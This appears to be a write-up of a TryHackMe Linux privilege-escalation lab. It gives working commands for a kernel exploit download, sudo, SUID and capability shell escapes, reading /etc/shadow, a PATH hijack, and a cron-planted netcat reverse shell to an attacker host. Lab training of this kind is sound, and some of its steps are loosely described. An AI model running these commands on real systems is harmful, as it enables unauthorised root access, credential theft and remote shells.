

# **TryHackMe: Linux Privilege Escalation**
## **By Ramyar Daneshgar**

## **Overview**
The **TryHackMe: Linux Privilege Escalation** lab is designed to **simulate real-world attack scenarios** where an attacker escalates privileges on a **compromised Linux system**. By applying **enumeration, kernel exploits, misconfigured SUDO permissions, SUID abuse, cron job manipulation, path hijacking, and NFS misconfigurations**, I was able to escalate privileges from a **low-privilege user** to **root access**.

This guide is a **comprehensive, step-by-step breakdown**, covering:
- **Enumeration & Information Gathering**
- **Kernel Exploits**
- **Misconfigured Sudo Permissions**
- **SUID Binary Exploitation**
- **Linux Capabilities Abuse**
- **Cron Job Manipulation**
- **Path Hijacking**
- **NFS Misconfigurations**
- **Tools Used**:  
  - **LinPEAS** (for enumeration)  
  - **GTFOBins** (for privilege escalation techniques)  
  - **Exploit-DB** (to find known vulnerabilities)  
  - **Metasploit Framework** (for post-exploitation techniques)  
  - **John the Ripper** (for cracking hashes)  

---

## **Task 1 & 2: Understanding Privilege Escalation**
### **What is Privilege Escalation?**
Privilege escalation is the process of gaining **higher-level access** in a system after obtaining an initial foothold. This can be classified as:

1. **Vertical Privilege Escalation**:  
   - A **low-privileged user** gains **root access**.
   - Example: Exploiting **SUID binaries**, **kernel vulnerabilities**, or **Sudo misconfigurations**.

2. **Horizontal Privilege Escalation**:  
   - Gaining access to another **user’s account** at the same privilege level.
   - Example: **Credential reuse**, **cracking hashes**, or **abusing misconfigured services**.

---

## **Task 3: Enumeration – The Most Critical Step**
### **Step 1: Gathering System Information**
Enumeration is **the first and most crucial step** in identifying potential attack vectors.

1. **Identify Hostname**:
   ```bash
   hostname
   ```
   **Output:** `wade7363`
   - **Why?** Useful for identifying the system's role in a network.

2. **Check Kernel Version**:
   ```bash
   uname -a
   ```
   **Output:** `Linux wade7363 3.13.0-24-generic`
   - **Why?** Older kernels may have **publicly known exploits**.

3. **Identify OS Version**:
   ```bash
   cat /etc/issue
   ```
   **Output:** `Ubuntu 14.04 LTS`
   - **Why?** Helps in finding **default vulnerabilities**.

4. **Check Installed Python Version**:
   ```bash
   python --version
   ```
   **Output:** `Python 2.7.6`
   - **Why?** Some exploits require **specific Python versions**.

5. **List Running Processes**:
   ```bash
   ps aux
   ```
   - **Why?** Identifies **running services** that may be vulnerable.

6. **Check Active Network Connections**:
   ```bash
   netstat -tunlp
   ```
   - **Why?** Detects **open ports** for potential **pivoting attacks**.

---

## **Task 4: Automated Enumeration with LinPEAS**
Instead of manually running enumeration commands, **LinPEAS** automates the process.

### **Step 1: Transfer LinPEAS**
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
**LinPEAS identifies**:
✅ **SUID binaries**  
✅ **Misconfigured sudo permissions**  
✅ **Kernel vulnerabilities**  
✅ **Writable files & directories**  

---

## **Task 5: Kernel Exploits**
After identifying the kernel version (`3.13.0-24`), I searched for **public exploits**.

### **Step 1: Search for Kernel Exploits**
```bash
searchsploit 3.13.0-24
```
- Found **CVE-2015-1328**, an **overlayfs privilege escalation exploit**.

### **Step 2: Download & Compile Exploit**
```bash
wget https://exploit-db.com/exploits/37292.c -O exploit.c
gcc exploit.c -o exploit
```
- **Why?** Most exploits are written in C and need `gcc` for compilation.

### **Step 3: Execute Exploit**
```bash
./exploit
```
- **Result:** **Root access obtained**.

### **Step 4: Retrieve the Root Flag**
```bash
cat /root/flag1.txt
```
- **Output:** `THM-283928727299220`

---

## **Task 6: Exploiting Sudo Misconfigurations**
### **Step 1: Check Sudo Permissions**
```bash
sudo -l
```
- **Output:**
  ```
  User karen may run the following commands:
  (ALL) NOPASSWD: /bin/nano, /usr/bin/nmap, /usr/bin/vim
  ```

### **Step 2: Exploit Nmap**
```bash
sudo nmap --interactive
!sh
```
- **Result:** Spawned **root shell**.

### **Step 3: Retrieve the Flag**
```bash
cat /root/flag2.txt
```
- **Output:** `THM-402028394`

---

## **Task 7: SUID Binary Exploitation**
### **Step 1: Find SUID Binaries**
```bash
find / -perm -4000 -type f 2>/dev/null
```
- Found `/usr/bin/base64`.

### **Step 2: Exploit Using GTFOBins**
```bash
/usr/bin/base64 -d /etc/shadow
```
- **Extracted password hashes**, cracked them using **John the Ripper**.

---

## **Task 8: Linux Capabilities Exploitation**
### **Step 1: Find Capabilities**
```bash
getcap -r / 2>/dev/null
```
- Found `/home/ubuntu/view = cap_setuid+ep`.

### **Step 2: Exploit**
```bash
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.system("/bin/sh")'
```
- **Result:** **Root shell spawned**.

---

## **Task 9: Cron Job Exploitation**
### **Step 1: Find Scheduled Cron Jobs**
```bash
cat /etc/crontab
```
- Found **backup.sh** running **every minute**.

### **Step 2: Modify the Script**
```bash
echo "nc -e /bin/bash <attacker_ip> 4444" > /etc/cron.hourly/backup.sh
chmod +x /etc/cron.hourly/backup.sh
```
### **Step 3: Start a Listener**
```bash
nc -lvnp 4444
```
- **Result:** **Reverse shell as root**.

---

## **Task 10: Path Hijacking**
### **Step 1: Find Writable Directories**
```bash
find / -writable -type d 2>/dev/null
```
### **Step 2: Inject Malicious Script**
```bash
echo "/bin/bash" > /tmp/cmd
chmod +x /tmp/cmd
export PATH=/tmp:$PATH
```
### **Step 3: Trigger Root Execution**
```bash
sudo some_command
```
- **Result:** **Privilege Escalation Achieved**.

